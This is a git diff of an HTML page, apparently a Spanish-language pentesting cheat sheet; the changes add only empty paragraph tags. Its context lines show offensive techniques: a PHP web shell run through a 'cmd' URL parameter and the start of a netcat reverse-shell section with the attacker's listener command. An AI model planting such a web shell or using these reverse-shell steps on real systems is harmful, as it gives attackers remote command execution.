@@ -18,16 +18,19 @@ put <span class="hljs-variable">$i</span>
 EOF
 <span class="hljs-keyword">done</span>
 </code></pre>
+<p></p>
 <h4 class="code-line" data-line-start=19 data-line-end=20 ><a id="Python_HTTP_server_19"></a>Python HTTP server</h4>
 <p class="has-line-data" data-line-start="0" data-line-end="1">Comando para iniciar un servidor HTTP con python en el puerto que nosotros queramos.</p>
 <pre><code class="has-line-data" data-line-start="21" data-line-end="23" class="language-sh">python2 -m SimpleHTTPServer <span class="hljs-number">8888</span>        <span class="hljs-comment">##### Python2</span>
 </code></pre>
 <pre><code class="has-line-data" data-line-start="24" data-line-end="26" class="language-sh">python3 -m http.server <span class="hljs-number">8888</span>             <span class="hljs-comment">##### Python3</span>
 </code></pre>
+<p></p>
 <h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Buscar_fichero_con_un_string_especfico_0"></a>Buscar fichero con un string específico</h4>
 <p class="has-line-data" data-line-start="1" data-line-end="2">Uso del comando grep para encontrar ficheros que contengan un string específico.</p>
 <pre><code class="has-line-data" data-line-start="3" data-line-end="5" class="language-sh">grep -rni <span class="hljs-string">'/directorio/'</span> <span class="hljs-operator">-e</span> <span class="hljs-string">'Texto que queramos buscar'</span>
 </code></pre>
+<p></p>
 <h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Ejecutar_comandos_en_bash_desde_la_url_0"></a>Ejecutar comandos en bash desde la url</h4>
 <p class="has-line-data" data-line-start="1" data-line-end="2">Para ello es necesario utilizar un pequeño script en php</p>
 <pre><code class="has-line-data" data-line-start="4" data-line-end="12" class="language-php"><span class="hljs-comment">## Name: script.php</span>
@@ -39,6 +42,7 @@ EOF
 <span class="hljs-preprocessor">?&gt;</span>
 </code></pre>
 <p class="has-line-data" data-line-start="22" data-line-end="23">Mediante esta url se pueden ejecutar los comandos desde un navegador: <code>http://&lt;ip&gt;/script.php?cmd=&lt;command&gt;</code></p>
+<p></p>
 <h4 class="code-line" data-line-start=0 data-line-end=1 ><a id="Netcat_reverse_shell_0"></a>Netcat reverse shell</h4>
 <p class="has-line-data" data-line-start="1" data-line-end="2">Atacante:</p>
 <pre><code class="has-line-data" data-line-start="3" data-line-end="5" class="language-sh">nc <span class="hljs-operator">-l</span> -p <span class="hljs-number">8888</span>
